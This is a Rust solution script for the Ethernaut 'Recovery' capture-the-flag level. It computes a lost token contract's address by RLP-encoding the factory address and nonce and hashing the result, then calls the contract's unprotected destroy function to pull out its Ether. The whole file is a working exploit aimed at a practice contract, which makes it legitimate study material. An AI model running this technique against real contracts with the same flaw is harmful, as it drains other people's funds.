//! Ethernaut 17 — Recovery.
//!
//! Goal: Recover all Ether from the lost `SimpleToken` created by `Recovery`.
//! The token's Ether balance, not the factory's, must become zero.
//!
//! https://github.com/OpenZeppelin/ethernaut/blob/d05643a/contracts/src/levels/Recovery.sol

use alloy::primitives::{Address, keccak256};
use alloy::providers::Provider;
use async_trait::async_trait;
use ctf::Actor;
use ctf::ethereum::ethernaut::lvl17_recovery::*;

pub struct Exploit;

alloy::sol!(
    #[sol(rpc)]
    SimpleToken,
    "../lib/ethernaut/contracts/out/Recovery.sol/SimpleToken.json"
);

#[async_trait]
impl ctf::Exploit for Exploit {
    type Target = Target;

    async fn attack(
        self,
        target: &Self::Target,
        offender: &Actor,
    ) -> eyre::Result<()> {
        let rlp_addr =
            std::iter::once(0x80 + 0x14).chain(target.address.iter().copied());

        let rlp_nonce = 0x01;
        let rlp_args: Vec<_> =
            rlp_addr.chain(std::iter::once(rlp_nonce)).collect();

        let len = u8::try_from(rlp_args.len())?;
        let rlp =
            std::iter::once(0xc0 + len).chain(rlp_args).collect::<Vec<_>>();

        println!("payload: {}", alloy::hex::encode_prefixed(&rlp));

        let address = <[u8; 20]>::try_from(
            keccak256(rlp).into_iter().skip(12).collect::<Vec<_>>(),
        )
        .unwrap();
        let address = Address::new(address);
        println!("SimpleToken address: {address}");

        let provider = offender.provider();
        let token = SimpleToken::new(address, provider.clone());

        let balance = provider.get_balance(address).await?;
        println!("Wei balance before: {balance}");

        token.destroy(offender.address()).send().await?.watch().await?;

        let balance = provider.get_balance(address).await?;
        println!("Wei balance after: {balance}");

        Ok(())
    }
}
